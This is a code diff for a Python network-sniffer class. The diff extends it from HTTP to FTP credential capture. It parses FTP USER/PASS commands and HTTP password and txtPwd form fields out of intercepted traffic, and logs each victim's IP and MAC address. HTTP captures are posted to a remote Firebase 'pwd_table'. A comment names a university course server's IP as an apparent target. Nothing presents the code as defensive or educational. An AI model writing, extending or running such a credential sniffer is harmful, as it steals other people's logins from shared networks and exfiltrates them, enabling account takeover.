@@ -9,7 +9,7 @@ from pprint import pprint
 import settings
 from utils import add_colons_to_mac
 
-APP_TO_PORT = {80: 'http', 23: 'telnet'}
+APP_TO_PORT = {80: 'http', 23: 'telnet', 21: 'ftp'}
 
 
 class Sniffer(object):
@@ -44,7 +44,30 @@ class Sniffer(object):
         regex = re.compile('(.*)[txtPwd]=(.*)')
         return content is not None and regex.search(content)
 
-    def _pick_info(self, data, client, server, app, eth_src):
+    def _pick_ftp_info(self, data, client, server, app, eth_src):
+        self.info_counter += 1
+        self.all_user_info[self.info_counter] = (
+            {'client': client, 'server': server,
+             'app': APP_TO_PORT.get(app),
+             'mac': add_colons_to_mac(binascii.hexlify(eth_src))}
+        )
+        if data.get('USER'):
+            self.all_user_info[self.info_counter].update(
+                {'login': data.get('USER')})
+        else:
+            self.all_user_info[self.info_counter].update({'login': None})
+
+        if data.get('PASS'):
+            self.all_user_info[self.info_counter].update(
+                {'password': data.get('PASS')})
+        else:
+            self.all_user_info[self.info_counter].update({'password': None})
+
+        print "FTP New Password get:"
+        pprint(self.all_user_info[self.info_counter])
+        # self._firebase.post('/pwd_table', self.all_user_info[self.info_counter])
+
+    def _pick_http_info(self, data, client, server, app, eth_src):
         self.info_counter += 1
         self.all_user_info[self.info_counter] = (
             {'client': client, 'server': server,
@@ -85,9 +108,27 @@ class Sniffer(object):
         else:
             self.all_user_info[self.info_counter].update({'password': None})
 
-        print "New Password get:"
+        print "HTTP New Password get:"
         pprint(self.all_user_info[self.info_counter])
         self._firebase.post('/pwd_table', self.all_user_info[self.info_counter])
+
+    def _get_ftp_payload(self, eth_pkt, ip_pkt, tcp_pkt):
+        if 'USER' in tcp_pkt.data:
+            regex = re.compile('USER (.*)')
+            user_obj = regex.search(tcp_pkt.data)
+            user_d = {'USER': user_obj.group(1)}
+            self._pick_ftp_info(user_d, socket.inet_ntoa(ip_pkt.src),
+                                socket.inet_ntoa(ip_pkt.dst), tcp_pkt.dport,
+                                eth_pkt.src)
+        elif 'PASS' in tcp_pkt.data:
+            regex = re.compile('PASS (.*)')
+            password_obj = regex.search(tcp_pkt.data)
+            password_d = {'PASS': password_obj.group(1)}
+            self._pick_ftp_info(password_d, socket.inet_ntoa(ip_pkt.src),
+                                socket.inet_ntoa(ip_pkt.dst), tcp_pkt.dport,
+                                eth_pkt.src)
+        else:
+            return
 
     def _get_http_payload(self, eth_pkt, ip_pkt, tcp_pkt):
         try:
@@ -107,23 +148,23 @@ class Sniffer(object):
                     # print 'query string found:', pwd_obj.group(0)
                     qs_d = urlparse.parse_qs(pwd_obj.group(0))
                     # print qs_d
-                    self._pick_info(qs_d, socket.inet_ntoa(ip_pkt.src),
-                                    socket.inet_ntoa(ip_pkt.dst),
-                                    tcp_pkt.dport, eth_pkt.src)
+                    self._pick_http_info(qs_d, socket.inet_ntoa(ip_pkt.src),
+                                         socket.inet_ntoa(ip_pkt.dst),
+                                         tcp_pkt.dport, eth_pkt.src)
 
         elif 'password=' in tcp_pkt.data:
             # print 'password', tcp.data
             qs_d = urlparse.parse_qs(tcp_pkt.data)
             # print qs_d
-            self._pick_info(qs_d, socket.inet_ntoa(ip_pkt.src),
-                            socket.inet_ntoa(ip_pkt.dst),
-                            tcp_pkt.dport, eth_pkt.src)
+            self._pick_http_info(qs_d, socket.inet_ntoa(ip_pkt.src),
+                                 socket.inet_ntoa(ip_pkt.dst),
+                                 tcp_pkt.dport, eth_pkt.src)
 
         elif 'txtPwd=' in tcp_pkt.data:
             qs_d = urlparse.parse_qs(tcp_pkt.data)
-            self._pick_info(qs_d, socket.inet_ntoa(ip_pkt.src),
-                            socket.inet_ntoa(ip_pkt.dst),
-                            tcp_pkt.dport, eth_pkt.src)
+            self._pick_http_info(qs_d, socket.inet_ntoa(ip_pkt.src),
+                                 socket.inet_ntoa(ip_pkt.dst),
+                                 tcp_pkt.dport, eth_pkt.src)
         else:
             return
         # Moocs dst IP 140.114.60.144
@@ -139,6 +180,7 @@ class Sniffer(object):
                     tcp = ip.data
                     if len(tcp.data) > 0:
                         self._get_http_payload(eth, ip, tcp)
+                        self._get_ftp_payload(eth, ip, tcp)
 
             except KeyboardInterrupt:
                 nrecv, ndrop, nifdrop = self.pc.stats()
